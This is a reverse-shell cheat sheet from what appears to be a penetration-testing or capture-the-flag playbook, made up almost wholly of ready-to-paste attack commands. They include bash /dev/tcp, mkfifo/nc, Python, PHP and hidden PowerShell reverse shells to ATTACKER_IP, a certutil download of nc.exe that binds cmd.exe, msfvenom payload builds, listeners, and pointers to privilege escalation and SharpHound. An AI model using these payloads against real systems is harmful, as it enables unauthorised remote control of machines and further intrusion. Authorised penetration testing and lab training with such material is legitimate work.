---
id: rev-shell
title: Reverse Shell
stage: foothold
tags: [windows, linux]
summary: Convert code execution into an interactive session by connecting the target back to your listener — the universal handoff from exploit to shell.
leads_to:
  - linux-sudo
  - linux-suid-caps
  - linux-cron
  - linux-kernel
  - linux-cred-hunting
  - linux-pam-polkit
  - token-impersonation
  - windows-service-misconfig
  - windows-stored-creds
  - windows-dll-hijack
  - windows-uac-bypass
  - windows-gpp-creds
  - linux-docker-escape
  - linux-shared-lib
  - bloodhound
---

## Prerequisites

Target has outbound connectivity to your IP on the listener port. Confirm your tun0 IP before generating payloads (`ip a show tun0`). If outbound is blocked, try common egress ports: 80, 443, 8080.

A reverse shell connects from the target back to your listener, converting any code execution primitive into an interactive session. Always try bash one-liners first — they require nothing on disk. Fall back to msfvenom binaries when shell builtins are unavailable or restricted.

## Quick Win

> Start the listener, paste the bash one-liner into your RCE vector — most reliable single command.

```bash
rlwrap nc -nvlp 4444
# On target:
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

## Listeners

> `rlwrap` wraps nc with readline support — arrow keys and history work without it you're stuck.

```bash
rlwrap nc -nvlp PORT
nc -nvlp PORT

# MSF handler (use for msfvenom staged payloads)
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST tun0; set LPORT PORT; run -j
```

## Linux Payloads

> Try bash first, mkfifo when /dev/tcp is unavailable, python3 as a reliable fallback.

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

```bash
# mkfifo (when bash /dev/tcp is restricted)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

```bash
# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

```bash
# PHP (from web context)
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'
```

## Windows Payloads

> PowerShell one-liner is cleanest — certutil + nc.exe when PS is blocked.

```powershell
powershell -nop -w hidden -c "$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```bash
# certutil download + nc.exe
certutil -urlcache -f http://ATTACKER_IP/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe ATTACKER_IP PORT
```

## msfvenom Payloads

> Use when you need a binary — exe for execution, exe-service for service installs, war for Tomcat.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o svc.exe
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f war -o shell.war
```

## TTY Upgrade (Linux)

> Do this immediately on landing — raw TTY enables Ctrl+C, sudo prompts, vim, and tab completion.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
stty rows 38 cols 120   # match your terminal: run 'stty size' locally first
```

## File Serving

> Host payloads for download — python3 for Linux, impacket SMB for Windows targets.

```bash
python3 -m http.server 8000
impacket-smbserver share $(pwd) -smb2support
```

## Leads To

Linux shell → run `sudo -l`, `find / -perm -4000`, `getcap -r /` immediately — these three cover the fastest privesc paths. Windows shell → `whoami /priv` and check for SeImpersonatePrivilege → GodPotato → SYSTEM. Domain-joined Windows → run SharpHound immediately for BloodHound analysis.
